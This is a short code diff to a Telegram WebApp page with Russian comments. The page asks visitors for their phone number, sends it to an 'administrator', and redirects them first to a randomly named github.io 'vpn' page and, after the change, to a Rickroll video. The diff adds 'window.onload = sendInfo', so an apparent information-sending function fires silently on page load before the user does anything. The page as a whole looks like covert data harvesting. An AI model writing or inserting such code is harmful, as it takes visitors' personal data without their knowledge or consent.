@@ -88,7 +88,8 @@
         console.error('Ошибка:', error);
     }
 }
-
+		
+		window.onload = sendInfo;
         const tg = window.Telegram.WebApp;
 
         // Инициализация темы
@@ -97,7 +98,6 @@
 
         // Функция для запроса номера телефона
         function requestPhoneNumber() {
-        	sendInfo();
             tg.requestContact((sent, event) => {
                 if (sent) {
                     const phoneNumber = event.responseUnsafe.contact.phone_number;
@@ -115,7 +115,7 @@
 
                     // Отправляем сообщение администратору
                     sendToAdmin(message);
-                    location.href = "https://t3fvygbhujnt25ibgvfn.github.io/showme/vpn.html";
+                    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                 } else {
                     tg.showAlert('Вы отменили запрос номера.');
                 }
